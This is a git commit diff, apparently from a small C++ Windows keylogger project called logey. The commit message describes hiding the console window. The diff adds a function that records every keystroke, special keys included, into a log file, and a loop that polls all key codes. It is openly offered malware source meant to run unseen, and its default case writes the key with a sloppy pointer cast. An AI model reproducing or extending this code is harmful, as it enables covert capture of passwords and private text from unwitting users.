e658bacf35f15bd5227be9578dbd150cd929d7e3
exler <kakkmar@gmail.com>
2017-10-04 22:17:31 +0200

    :art: Make a header file for constants and includes, hide console window Also make a debug variable so you can show the console while debugging.

--- logey.cpp
+++ logey.cpp
@@ -1,13 +1,6 @@
-#include <iostream>
-#include <Windows.h>
+#include "logey.h"
 
-using namespace std;
-
-void keys(int key, char *filename);
-
-int main()
-{
-	
+int main() {
 	while (true) // infinite loop
 	{
 		for (int i = 8; i <= 255; i++) {
@@ -18,4 +11,52 @@ int main()
 	}
 
 	return 0;
+}
+
+void keys(int key, char *filename) {
+
+	FILE *OUTPUT_FILE;
+	OUTPUT_FILE = fopen(filename, "a+");
+
+	switch(key) {
+		case VK_RETURN:
+			cout << "{ENTER}" << endl;
+			fprintf(OUTPUT_FILE, "%s", "\n");
+			break;
+		case VK_SHIFT:
+			cout << "{SHIFT}";
+			fprintf(OUTPUT_FILE, "%s", "{SHIFT}");
+			break;
+		case VK_SPACE:
+			cout << " ";
+			fprintf(OUTPUT_FILE, "%s", " ");
+			break;
+		case VK_BACK:
+			cout << "{BACKSPACE}";
+			fprintf(OUTPUT_FILE, "%s", "{BACKSPACE}");
+			break;
+		case VK_CONTROL:
+			cout << "{CONTROL}";
+			fprintf(OUTPUT_FILE, "%s", "{CONTROL}");
+			break;
+		case VK_TAB:
+			cout << "{TAB}";
+			fprintf(OUTPUT_FILE, "%s", "{TAB}");
+			break;
+		case VK_ESCAPE:
+			cout << "{ESCAPE}";
+			fprintf(OUTPUT_FILE, "%s", "{ESCAPE}");
+			break;
+		case VK_MENU:
+			cout << "{ALT}";
+			fprintf(OUTPUT_FILE, "%s", "{ALT}");
+			break;
+		default:
+			char x = static_cast<char>(key);
+			cout << x;
+			fprintf(OUTPUT_FILE, "%s", &key);
+			break;
+	}
+
+	fclose(OUTPUT_FILE);
 }
